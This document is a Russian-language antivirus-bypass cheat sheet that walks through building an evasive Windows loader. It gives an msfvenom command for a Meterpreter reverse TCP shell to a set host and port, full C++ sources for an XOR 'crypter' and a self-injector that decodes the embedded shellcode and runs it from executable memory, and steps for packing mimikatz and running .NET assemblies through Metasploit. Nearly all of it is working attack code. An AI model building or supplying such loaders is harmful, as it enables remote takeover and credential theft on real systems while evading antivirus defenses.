# AV bypass

\
Компилируем msfvenom

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.124 LPORT=4444 -f raw -o sh_code
```

Преобразовать в hex формат для компиляции бинарный файл:

```bash
xxd -i shellmsf1 
```

Для компиляции нужна Visual Studio или что-то иное для c++, например gcc\
Вставить это в код криптера и скомпилировать (из консоли разработчика):

```cmd
cl crypter.c
```

запустить

```cmd
crypter.exe
```

Полученный массив байт вставить в self-injector и скомпилировать с помощью visual studio в режиме сборки Release.\
Запускаем:

```cmd
echo x | ConsoleApplication3.exe
```

Код криптера, который скинет файл на диск, а также выкинет в консоль

```cpp
#include <windows.h>
#include <iostream>
#include <fstream>
using namespace std;

int main(int argc, char** argv) {
	char b[] = {
  0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00, 0x41, 0x51,
  0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52,
  0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x4d, 0x31, 0xc9,
  0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x31, 0xc0,
  0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
  0x01, 0xc1, 0xe2, 0xed, 0x52, 0x48, 0x8b, 0x52, 0x20, 0x41, 0x51, 0x8b,
  0x42, 0x3c, 0x48, 0x01, 0xd0, 0x66, 0x81, 0x78, 0x18, 0x0b, 0x02, 0x0f,
  0x85, 0x72, 0x00, 0x00, 0x00, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
  0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x44, 0x8b, 0x40, 0x20, 0x8b,
  0x48, 0x18, 0x49, 0x01, 0xd0, 0x50, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41,
  0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
  0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1,
  0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
  0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44,
  0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01,
  0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
  0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
  0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x4b, 0xff, 0xff, 0xff, 0x5d, 0x49,
  0xbe, 0x77, 0x73, 0x32, 0x5f, 0x33, 0x32, 0x00, 0x00, 0x41, 0x56, 0x49,
  0x89, 0xe6, 0x48, 0x81, 0xec, 0xa0, 0x01, 0x00, 0x00, 0x49, 0x89, 0xe5,
  0x49, 0xbc, 0x02, 0x00, 0x11, 0x5c, 0xc0, 0xa8, 0x01, 0x7c, 0x41, 0x54,
  0x49, 0x89, 0xe4, 0x4c, 0x89, 0xf1, 0x41, 0xba, 0x4c, 0x77, 0x26, 0x07,
  0xff, 0xd5, 0x4c, 0x89, 0xea, 0x68, 0x01, 0x01, 0x00, 0x00, 0x59, 0x41,
  0xba, 0x29, 0x80, 0x6b, 0x00, 0xff, 0xd5, 0x6a, 0x0a, 0x41, 0x5e, 0x50,
  0x50, 0x4d, 0x31, 0xc9, 0x4d, 0x31, 0xc0, 0x48, 0xff, 0xc0, 0x48, 0x89,
  0xc2, 0x48, 0xff, 0xc0, 0x48, 0x89, 0xc1, 0x41, 0xba, 0xea, 0x0f, 0xdf,
  0xe0, 0xff, 0xd5, 0x48, 0x89, 0xc7, 0x6a, 0x10, 0x41, 0x58, 0x4c, 0x89,
  0xe2, 0x48, 0x89, 0xf9, 0x41, 0xba, 0x99, 0xa5, 0x74, 0x61, 0xff, 0xd5,
  0x85, 0xc0, 0x74, 0x0a, 0x49, 0xff, 0xce, 0x75, 0xe5, 0xe8, 0x93, 0x00,
  0x00, 0x00, 0x48, 0x83, 0xec, 0x10, 0x48, 0x89, 0xe2, 0x4d, 0x31, 0xc9,
  0x6a, 0x04, 0x41, 0x58, 0x48, 0x89, 0xf9, 0x41, 0xba, 0x02, 0xd9, 0xc8,
  0x5f, 0xff, 0xd5, 0x83, 0xf8, 0x00, 0x7e, 0x55, 0x48, 0x83, 0xc4, 0x20,
  0x5e, 0x89, 0xf6, 0x6a, 0x40, 0x41, 0x59, 0x68, 0x00, 0x10, 0x00, 0x00,
  0x41, 0x58, 0x48, 0x89, 0xf2, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x58, 0xa4,
  0x53, 0xe5, 0xff, 0xd5, 0x48, 0x89, 0xc3, 0x49, 0x89, 0xc7, 0x4d, 0x31,
  0xc9, 0x49, 0x89, 0xf0, 0x48, 0x89, 0xda, 0x48, 0x89, 0xf9, 0x41, 0xba,
  0x02, 0xd9, 0xc8, 0x5f, 0xff, 0xd5, 0x83, 0xf8, 0x00, 0x7d, 0x28, 0x58,
  0x41, 0x57, 0x59, 0x68, 0x00, 0x40, 0x00, 0x00, 0x41, 0x58, 0x6a, 0x00,
  0x5a, 0x41, 0xba, 0x0b, 0x2f, 0x0f, 0x30, 0xff, 0xd5, 0x57, 0x59, 0x41,
  0xba, 0x75, 0x6e, 0x4d, 0x61, 0xff, 0xd5, 0x49, 0xff, 0xce, 0xe9, 0x3c,
  0xff, 0xff, 0xff, 0x48, 0x01, 0xc3, 0x48, 0x29, 0xc6, 0x48, 0x85, 0xf6,
  0x75, 0xb4, 0x41, 0xff, 0xe7, 0x58, 0x6a, 0x00, 0x59, 0x49, 0xc7, 0xc2,
  0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5
};
	char c[sizeof b];
	for (int i = 0; i < sizeof b; i++) 
	{
		c[i] = b[i] ^ 'x';
		printf("0x%01x", c[i]);
		printf(",");
	}

	return 0;

}

```

Вставляем hex payload в массив b, как показано в примере

x - это ключ, который можно заменить на любой другой байт

После этого используем другой код для компилирования боевого эксплойта:

```cpp

#include <windows.h>
#include <iostream>

#include <fstream>
using namespace std;

int main(int argc, char** argv) {
	char b[] = { 
0x84,0x30,0xfb,0x9c,0x88,0x90,0xb4,0x78,0x78,0x78,0x39,0x29,0x39,0x28,0x2a,0x29,0x2e,0x30,0x49,0xaa,0x1d,0x30,0xf3,0x2a,0x18,0x30,0xf3,0x2a,0x60,0x30,0xf3,0x2a,0x58,0x35,0x49,0xb1,0x30,0x77,0xcf,0x32,0x32,0x30,0xf3,0xa,0x28,0x30,0x49,0xb8,0xd4,0x44,0x19,0x4,0x7a,0x54,0x58,0x39,0xb9,0xb1,0x75,0x39,0x79,0xb9,0x9a,0x95,0x2a,0x30,0xf3,0x2a,0x58,0x39,0x29,0xf3,0x3a,0x44,0x30,0x79,0xa8,0x1e,0xf9,0x0,0x60,0x73,0x7a,0x77,0xfd,0xa,0x78,0x78,0x78,0xf3,0xf8,0xf0,0x78,0x78,0x78,0x30,0xfd,0xb8,0xc,0x1f,0x30,0x79,0xa8,0x3c,0xf3,0x38,0x58,0xf3,0x30,0x60,0x31,0x79,0xa8,0x28,0x9b,0x2e,0x30,0x87,0xb1,0x39,0xf3,0x4c,0xf0,0x30,0x79,0xae,0x35,0x49,0xb1,0x30,0x49,0xb8,0xd4,0x39,0xb9,0xb1,0x75,0x39,0x79,0xb9,0x40,0x98,0xd,0x89,0x34,0x7b,0x34,0x5c,0x70,0x3d,0x41,0xa9,0xd,0xa0,0x20,0x3c,0xf3,0x38,0x5c,0x31,0x79,0xa8,0x1e,0x39,0xf3,0x74,0x30,0x3c,0xf3,0x38,0x64,0x31,0x79,0xa8,0x39,0xf3,0x7c,0xf0,0x30,0x79,0xa8,0x39,0x20,0x39,0x20,0x26,0x21,0x22,0x39,0x20,0x39,0x21,0x39,0x22,0x30,0xfb,0x94,0x58,0x39,0x2a,0x87,0x98,0x20,0x39,0x21,0x22,0x30,0xf3,0x6a,0x91,0x33,0x87,0x87,0x87,0x25,0x31,0xc6,0xf,0xb,0x4a,0x27,0x4b,0x4a,0x78,0x78,0x39,0x2e,0x31,0xf1,0x9e,0x30,0xf9,0x94,0xd8,0x79,0x78,0x78,0x31,0xf1,0x9d,0x31,0xc4,0x7a,0x78,0x69,0x24,0xb8,0xd0,0x79,0x4,0x39,0x2c,0x31,0xf1,0x9c,0x34,0xf1,0x89,0x39,0xc2,0x34,0xf,0x5e,0x7f,0x87,0xad,0x34,0xf1,0x92,0x10,0x79,0x79,0x78,0x78,0x21,0x39,0xc2,0x51,0xf8,0x13,0x78,0x87,0xad,0x12,0x72,0x39,0x26,0x28,0x28,0x35,0x49,0xb1,0x35,0x49,0xb8,0x30,0x87,0xb8,0x30,0xf1,0xba,0x30,0x87,0xb8,0x30,0xf1,0xb9,0x39,0xc2,0x92,0x77,0xa7,0x98,0x87,0xad,0x30,0xf1,0xbf,0x12,0x68,0x39,0x20,0x34,0xf1,0x9a,0x30,0xf1,0x81,0x39,0xc2,0xe1,0xdd,0xc,0x19,0x87,0xad,0xfd,0xb8,0xc,0x72,0x31,0x87,0xb6,0xd,0x9d,0x90,0xeb,0x78,0x78,0x78,0x30,0xfb,0x94,0x68,0x30,0xf1,0x9a,0x35,0x49,0xb1,0x12,0x7c,0x39,0x20,0x30,0xf1,0x81,0x39,0xc2,0x7a,0xa1,0xb0,0x27,0x87,0xad,0xfb,0x80,0x78,0x6,0x2d,0x30,0xfb,0xbc,0x58,0x26,0xf1,0x8e,0x12,0x38,0x39,0x21,0x10,0x78,0x68,0x78,0x78,0x39,0x20,0x30,0xf1,0x8a,0x30,0x49,0xb1,0x39,0xc2,0x20,0xdc,0x2b,0x9d,0x87,0xad,0x30,0xf1,0xbb,0x31,0xf1,0xbf,0x35,0x49,0xb1,0x31,0xf1,0x88,0x30,0xf1,0xa2,0x30,0xf1,0x81,0x39,0xc2,0x7a,0xa1,0xb0,0x27,0x87,0xad,0xfb,0x80,0x78,0x5,0x50,0x20,0x39,0x2f,0x21,0x10,0x78,0x38,0x78,0x78,0x39,0x20,0x12,0x78,0x22,0x39,0xc2,0x73,0x57,0x77,0x48,0x87,0xad,0x2f,0x21,0x39,0xc2,0xd,0x16,0x35,0x19,0x87,0xad,0x31,0x87,0xb6,0x91,0x44,0x87,0x87,0x87,0x30,0x79,0xbb,0x30,0x51,0xbe,0x30,0xfd,0x8e,0xd,0xcc,0x39,0x87,0x9f,0x20,0x12,0x78,0x21,0x31,0xbf,0xba,0x88,0xcd,0xda,0x2e,0x87,0xad
 };
	char c[sizeof b];
	//ofstream myfile;
	//myfile.open("encrypted.txt");
	char x;
	std::cin >> x;
	for (int i = 0; i < sizeof b; i++) 
	{
		c[i] = b[i] ^ x;
		//c[i] = b[i];
		//myfile << c[i];
		//printf("%02x", c[i]);
	}
	//printf(c);
	//myfile.close();
	
	void* exec = VirtualAlloc(0, sizeof c, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, c, sizeof c);
	((void(*)())exec)();
	//return 0;
}

```

После сборки у нас получается полностью готовый исполняемый файл\
После запуска он ждет ввода ключа, ключ вводим как был на первом этапе

```bash
xxd -i mimikatz.shc.exe

```

[https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/windows/manage/execute\_dotnet\_assembly.md](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/windows/manage/execute\_dotnet\_assembly.md)\
use post/windows/manage/execute\_dotnet\_assembly
